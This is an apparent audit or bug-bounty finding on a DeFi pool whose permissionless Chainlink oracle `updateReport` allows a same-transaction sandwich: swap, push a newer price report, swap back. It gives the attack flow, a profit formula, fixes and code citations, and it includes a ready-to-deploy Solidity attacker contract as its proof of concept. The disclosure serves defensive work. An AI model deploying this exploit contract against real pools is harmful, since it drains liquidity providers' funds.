### Title
Permissionless `updateReport` Allows Same-Transaction Oracle Sandwich Against LP Funds — (`File: smart-contracts-poc/contracts/oracles/providers/ChainlinkOracle.sol`)

---

### Summary

`ChainlinkOracle.updateReport()` is permissionless: any caller who holds a valid DON-signed report can push a new price into the oracle at any time. Because `MetricOmmPool.swap()` reads the oracle fresh on every call and the reentrancy guard only blocks *nested* re-entry (not sequential calls in the same transaction), an attacker can execute a two-swap sandwich around a self-submitted oracle update in a single atomic transaction, extracting value from LPs.

---

### Finding Description

**Oracle update path — permissionless by design**

`ChainlinkOracle.updateReport()` has no caller restriction:

```solidity
function updateReport(bytes calldata fullReport) external {
    _store(_verifyReport(fullReport));
}
```

The only gate is DON-signature verification via `verifierProxy.verify`. Chainlink Data Streams reports are published off-chain and are freely observable; any party can collect them and replay them on-chain in any order, subject only to the per-feed timestamp monotonicity check (`isAfter`).

**Pool reads oracle fresh on every swap**

Inside `MetricOmmPool.swap()`:

```solidity
(uint128 bidPriceX64, uint128 askPriceX64) = _getBidAndAskPriceX64();
```

`_getBidAndAskPriceX64()` calls `IPriceProvider(activePriceProvider).getBidAndAskPrice()` which in turn calls `oracle.price(feedId, pool)` — a live storage read of the current oracle data. There is no caching, no per-block price lock, and no TWAP.

**Sequential swaps in one transaction are not blocked**

The `nonReentrant(PoolActions.SWAP)` modifier uses transient storage that is set at the start of a swap and cleared at its end. Two *sequential* (non-nested) swap calls in the same transaction are fully permitted; only *nested* re-entry is blocked.

**Attack flow (single atomic transaction)**

```
AttackerContract.attack():
  1. pool.swap(zeroForOne=false, ...)   // buy token0 at ask derived from P_old
  2. oracle.updateReport(report_P_new)  // push newer DON-signed report; oracle now stores P_new > P_old
  3. pool.swap(zeroForOne=true, ...)    // sell token0 at bid derived from P_new
```

Step 2 requires no swap context — the `inSwap()` binding enforced by `OracleBase.price()` protects the oracle *read* path, not the oracle *write* path. The update succeeds unconditionally as long as the report's timestamp is strictly newer than the stored one.

**Profit condition**

```
profit = (bid_at_P_new − ask_at_P_old) × amount − gas
```

With a typical oracle spread of ~10 bps, a price move of ≥ 0.1 % between the two reports makes the trade profitable. During high-volatility periods, moves of this magnitude occur within seconds, and multiple valid DON-signed reports spanning that range are simultaneously available off-chain.

The same attack applies to `CompressedOracleV1.updateBySignature()`, which is also callable by anyone holding a valid creator-signed slot word — a common off-chain distribution model.

---

### Impact Explanation

LPs bear the loss. The pool sells token0 to the attacker at a price anchored to the stale (lower) oracle value, then buys it back at the updated (higher) oracle value. The difference — net of the bid/ask spread — is extracted from LP-owned bin balances (`binTotals.scaledToken0` / `binTotals.scaledToken1`). This is a direct, quantifiable loss of LP principal with no recovery path.

**Severity: Medium**

---

### Likelihood Explanation

- Chainlink Data Streams reports are publicly observable off-chain; no privileged access is required.
- The attacker needs only two valid reports with strictly increasing timestamps — a condition that is trivially satisfied during any price movement.
- No special pool role, no admin key, no malicious setup assumption is required.
- The attack is atomic and reverts cleanly if unprofitable, so there is no capital risk to the attacker beyond gas.

**Likelihood: Medium**

---

### Recommendation

1. **Per-block price lock**: Record `block.number` the first time the oracle price is read during a swap and reject any oracle update (or re-read) for the same feed within the same block. This mirrors the recommendation in the external report.
2. **Commit-reveal / TWAP**: Derive `midPriceX64` from a short TWAP rather than a spot read, making single-block manipulation unprofitable.
3. **Separate update and read windows**: Require that a newly submitted report is at least one block old before it can be consumed by a swap (i.e., `block.number > reportBlock`).

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

interface IPool {
    function swap(address recipient, bool zeroForOne, int128 amountSpecified,
                  uint128 priceLimitX64, bytes calldata callbackData,
                  bytes calldata extensionData) external returns (int128, int128);
}
interface IOracle {
    function updateReport(bytes calldata fullReport) external;
}
interface IERC20 { function approve(address, uint256) external; }

contract OracleSandwich {
    IPool   immutable pool;
    IOracle immutable oracle;
    address immutable token0;
    address immutable token1;

    constructor(address _pool, address _oracle, address _t0, address _t1) {
        pool = IPool(_pool); oracle = IOracle(_oracle);
        token0 = _t0; token1 = _t1;
    }

    /// @param reportNew  Valid DON-signed report with P_new > P_current, T_new > T_current
    /// @param amount     token1 input for the first swap
    function attack(bytes calldata reportNew, int128 amount) external {
        IERC20(token1).approve(address(pool), uint256(int256(amount)));

        // 1. Buy token0 at ask derived from current (lower) oracle price P_old
        pool.swap(address(this), false, amount, 0, "", "");

        // 2. Push the newer, higher-price report — no swap context required
        oracle.updateReport(reportNew);

        // 3. Sell token0 at bid derived from new (higher) oracle price P_new
        int128 token0Bal = int128(int256(IERC20(token0).balanceOf(address(this))));
        IERC20(token0).approve(address(pool), uint256(int256(token0Bal)));
        pool.swap(msg.sender, true, token0Bal, 0, "", "");
        // profit = token1 received in step 3 − token1 spent in step 1
    }

    // swap callback
    function metricOmmSwapCallback(int256 d0, int256 d1, bytes calldata) external {
        if (d0 > 0) IERC20(token0).transfer(msg.sender, uint256(d0));
        if (d1 > 0) IERC20(token1).transfer(msg.sender, uint256(d1));
    }
}
```

**Expected result**: `token1` balance of `msg.sender` after the call exceeds the `amount` input, with the difference coming from LP bin balances. The attack is atomic and reverts if unprofitable. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** smart-contracts-poc/contracts/oracles/providers/ChainlinkOracle.sol (L68-95)
```text
    function updateReport(bytes calldata fullReport) external {
        _store(_verifyReport(fullReport));
    }

    function updateReports(bytes[] calldata fullReports) external {
        for (uint256 i; i < fullReports.length; ++i) {
            _store(_verifyReport(fullReports[i]));
        }
    }

    /// @dev Verifies a DON-signed report via the Data Streams VerifierProxy, paying a fixed fee from
    ///      the contract balance, and returns the verified report blob. Virtual: a future stream
    ///      family (e.g. a distinct HFS verification flow) can override.
    function _verifyReport(bytes calldata fullReport) internal virtual returns (bytes memory reportData) {
        return verifierProxy.verify{value: VERIFICATION_FEE}(fullReport, abi.encode(feeToken));
    }

    function _store(bytes memory reportData) internal {
        (bytes32 feedId, OracleData memory d) = _decodeReport(reportData);

        d.timestampMs.revertIfZero();
        d.timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);

        if (d.timestampMs.isAfter(oracleData[feedId].timestampMs)) {
            oracleData[feedId] = d;
            emit ReportStored(feedId, d.price, d.spread0, d.timestampMs);
        }
    }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L224-248)
```text
  ) external whenNotPaused nonReentrant(PoolActions.SWAP) returns (int128, int128) {
    require(amountSpecified != 0, InvalidAmount());

    uint256 packedSlot0Initial = Slot0Library.loadPackedSlot0();
    (uint128 bidPriceX64, uint128 askPriceX64) = _getBidAndAskPriceX64();

    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );

    (uint256 midPriceX64, uint256 baseFeeX64) =
      SwapMath.midAndSpreadFeeX64FromBidAsk(uint256(bidPriceX64), uint256(askPriceX64));
    SwapMath.InternalSwapParams memory params =
      SwapMath.InternalSwapParams({midPriceX64: midPriceX64, baseFeeX64: baseFeeX64, priceLimitX64: priceLimitX64});

    (int256 amount0Delta, int256 amount1Delta, uint256 protocolFeeAmount) =
      _executeSwap(zeroForOne, amountSpecified, params);
```

**File:** metric-core/contracts/MetricOmmPool.sol (L633-637)
```text
  function _resolvedPriceProvider() internal view returns (address) {
    address imm = IMMUTABLE_PRICE_PROVIDER;
    if (imm != address(0)) return imm;
    return priceProvider;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L804-813)
```text
  function _getBidAndAskPriceX64() internal returns (uint128 bidPriceX64, uint128 askPriceX64) {
    address activePriceProvider = _resolvedPriceProvider();
    try IPriceProvider(activePriceProvider).getBidAndAskPrice() returns (uint128 bid, uint128 ask) {
      if (bid >= ask) revert BidGreaterThanAsk();
      if (bid == 0) revert BidIsZero();
      return (bid, ask);
    } catch (bytes memory reason) {
      revert PriceProviderFailed(reason);
    }
  }
```
